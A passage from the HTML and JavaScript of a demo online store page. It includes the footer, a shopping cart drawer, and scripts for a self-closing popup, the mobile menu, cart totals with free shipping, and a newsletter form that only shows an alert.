            <li><a href="#products">New Arrivals</a></li>
            <li><a href="#products">Best Sellers</a></li>
            <li><a href="#products">Sale</a></li>
            <li><a href="#products">Gift Cards</a></li>
          </ul>
        </div>

        <div>
          <h4>Support</h4>
          <ul>
            <li><a href="#">Track Order</a></li>
            <li><a href="#">Shipping Info</a></li>
            <li><a href="#">Returns</a></li>
            <li><a href="#">Contact Us</a></li>
          </ul>
        </div>

        <div>
          <h4>Company</h4>
          <ul>
            <li><a href="#about">About</a></li>
            <li><a href="#">Careers</a></li>
            <li><a href="#">Privacy Policy</a></li>
            <li><a href="#">Terms of Service</a></li>
          </ul>
        </div>
      </div>

      <div class="container footer-bottom">
        <span>© <span id="year">2026</span> Shopdeal. All rights reserved.</span>
        <span>Demo store · Images from picsum.photos</span>
      </div>
    </footer>
  </div>

  <!-- ===================== CART DRAWER ===================== -->
  <div class="overlay" id="cartOverlay"></div>

  <aside class="cart-drawer" id="cartDrawer" aria-label="Shopping cart">
    <div class="cart-head">
      <div>
        <h3>Your Cart</h3>
        <span id="cartCountLabel">0 items</span>
      </div>
      <button class="cart-close" id="cartClose" type="button" aria-label="Close cart">✕</button>
    </div>

    <div class="cart-items" id="cartItems">
      <div class="cart-empty">
        <div class="big">🛒</div>
        <p>Your cart is empty</p>
        <small>Add something you love to get started.</small>
      </div>
    </div>

    <div class="cart-foot">
      <div class="cart-row"><span>Subtotal</span><span id="cartSubtotal">$0.00</span></div>
      <div class="cart-row"><span>Shipping</span><span id="cartShipping">—</span></div>
      <div class="cart-row total"><span>Total</span><span id="cartTotal">$0.00</span></div>
      <button class="checkout" id="checkoutBtn" type="button">Secure Checkout</button>
      <p class="cart-secure">🔒 Encrypted &amp; PCI-compliant checkout</p>
    </div>
  </aside>

  <script>
    /* ============================================================
       POPUP CONTROLS — auto-hide after 3 seconds
       ============================================================ */
    (function () {
      var popup = document.getElementById('customPopup');
      var cancel = document.getElementById('cancelBtn');
      var cont = document.getElementById('continueBtn');
      var autoCloseTimer = null;

      function closePopup() {
        if (popup.classList.contains('is-hidden')) return;
        popup.classList.add('is-hidden');
        document.body.style.overflow = '';
        if (autoCloseTimer) {
          clearTimeout(autoCloseTimer);
          autoCloseTimer = null;
        }
      }

      document.body.style.overflow = 'hidden';

      // Auto-hide popup after 3 seconds
      autoCloseTimer = setTimeout(closePopup, 3000);

      cancel.addEventListener('click', closePopup);
      cont.addEventListener('click', closePopup);
    })();

    /* ============================================================
       LIVE DATE (US format)
       ============================================================ */
    (function () {
      var el = document.getElementById('liveDate');
      function render() {
        var now = new Date();
        el.textContent = '🕒 ' + now.toLocaleDateString('en-US', {
          weekday: 'short', month: 'short', day: 'numeric', year: 'numeric'
        });
      }
      render();
      setInterval(render, 60000);
    })();

    /* ============================================================
       MOBILE MENU
       ============================================================ */
    (function () {
      var burger = document.getElementById('burger');
      var menu = document.getElementById('mobileMenu');
      burger.addEventListener('click', function () {
        menu.classList.toggle('open');
      });
      menu.querySelectorAll('a').forEach(function (a) {
        a.addEventListener('click', function () { menu.classList.remove('open'); });
      });
    })();

    /* ============================================================
       CART
       ============================================================ */
    (function () {
      var FREE_SHIP_THRESHOLD = 75;
      var cart = [];

      var usd = new Intl.NumberFormat('en-US', { style: 'currency', currency: 'USD' });

      var drawer      = document.getElementById('cartDrawer');
      var overlay     = document.getElementById('cartOverlay');
      var openBtn     = document.getElementById('cartBtn');
      var closeBtn    = document.getElementById('cartClose');
      var itemsEl     = document.getElementById('cartItems');
      var badgeEl     = document.getElementById('cartBadge');
      var countLabel  = document.getElementById('cartCountLabel');
      var subEl       = document.getElementById('cartSubtotal');
      var shipEl      = document.getElementById('cartShipping');
      var totalEl     = document.getElementById('cartTotal');
      var checkoutBtn = document.getElementById('checkoutBtn');

      function openCart() {
        drawer.classList.add('open');
        overlay.classList.add('open');
      }
      function closeCart() {
        drawer.classList.remove('open');
        overlay.classList.remove('open');
      }

      openBtn.addEventListener('click', openCart);
      closeBtn.addEventListener('click', closeCart);
      overlay.addEventListener('click', closeCart);
      document.addEventListener('keydown', function (e) {
        if (e.key === 'Escape') closeCart();
      });

      function findItem(id) {
        for (var i = 0; i < cart.length; i++) {
          if (cart[i].id === id) return cart[i];
        }
        return null;
      }

      function addToCart(product) {
        var existing = findItem(product.id);
        if (existing) {
          existing.qty += 1;
        } else {
          cart.push({ id: product.id, name: product.name, price: product.price, img: product.img, qty: 1 });
        }
        render();
        openCart();
      }

      function changeQty(id, delta) {
        var item = findItem(id);
        if (!item) return;
        item.qty += delta;
        if (item.qty <= 0) {
          cart = cart.filter(function (i) { return i.id !== id; });
        }
        render();
      }

      function removeItem(id) {
        cart = cart.filter(function (i) { return i.id !== id; });
        render();
      }

      function subtotal() {
        return cart.reduce(function (sum, i) { return sum + i.price * i.qty; }, 0);
      }

      function render() {
        var count = cart.reduce(function (s, i) { return s + i.qty; }, 0);
        badgeEl.textContent = count;
        countLabel.textContent = count + (count === 1 ? ' item' : ' items');

        if (!cart.length) {
          itemsEl.innerHTML =
            '<div class="cart-empty">' +
              '<div class="big">🛒</div>' +
              '<p>Your cart is empty</p>' +
              '<small>Add something you love to get started.</small>' +
            '</div>';
        } else {
          itemsEl.innerHTML = cart.map(function (i) {
            return '' +
              '<div class="cart-item">' +
                '<img src="' + i.img + '" alt="">' +
                '<div class="cart-item-info">' +
                  '<h4>' + i.name + '</h4>' +
                  '<span class="unit">' + usd.format(i.price) + ' each</span>' +
                  '<div class="cart-item-foot">' +
                    '<div class="qty">' +
                      '<button type="button" data-act="dec" data-id="' + i.id + '" aria-label="Decrease">−</button>' +
                      '<span>' + i.qty + '</span>' +
                      '<button type="button" data-act="inc" data-id="' + i.id + '" aria-label="Increase">+</button>' +
                    '</div>' +
                    '<span class="line-total">' + usd.format(i.price * i.qty) + '</span>' +
                  '</div>' +
                  '<button class="remove" type="button" data-act="rm" data-id="' + i.id + '">Remove</button>' +
                '</div>' +
              '</div>';
          }).join('');
        }

        var sub = subtotal();
        var shipping = sub === 0 ? 0 : (sub >= FREE_SHIP_THRESHOLD ? 0 : 6.99);

        subEl.textContent = usd.format(sub);
        shipEl.textContent = sub === 0 ? '—' : (shipping === 0 ? 'FREE' : usd.format(shipping));
        totalEl.textContent = usd.format(sub + shipping);
      }

      itemsEl.addEventListener('click', function (e) {
        var btn = e.target.closest('[data-act]');
        if (!btn) return;
        var id = btn.getAttribute('data-id');
        var act = btn.getAttribute('data-act');
        if (act === 'inc') changeQty(id, 1);
        if (act === 'dec') changeQty(id, -1);
        if (act === 'rm') removeItem(id);
      });

      document.querySelectorAll('.card').forEach(function (card) {
        var btn = card.querySelector('.add');
        btn.addEventListener('click', function () {
          addToCart({
            id: card.getAttribute('data-id'),
            name: card.getAttribute('data-name'),
            price: parseFloat(card.getAttribute('data-price')),
            img: card.querySelector('img').getAttribute('src')
          });
        });
      });

      checkoutBtn.addEventListener('click', function () {
        if (!cart.length) {
          alert('Your cart is empty');
          return;
        }
        alert('Demo store — checkout is not connected');
      });

      render();
    })();

    /* ============================================================
       NEWSLETTER (demo only)
       ============================================================ */
    (function () {
      var form = document.getElementById('signupForm');
      var input = document.getElementById('signupEmail');

      form.addEventListener('submit', function (e) {
        e.preventDefault();
        if (!input.value) return;
        alert('Thanks! Your $10 code is on its way.');
        form.reset();
      });
    })();

    /* ============================================================
       FOOTER YEAR
       ============================================================ */
    document.getElementById('year').textContent = new Date().getFullYear();
  </script>

</body>
</html>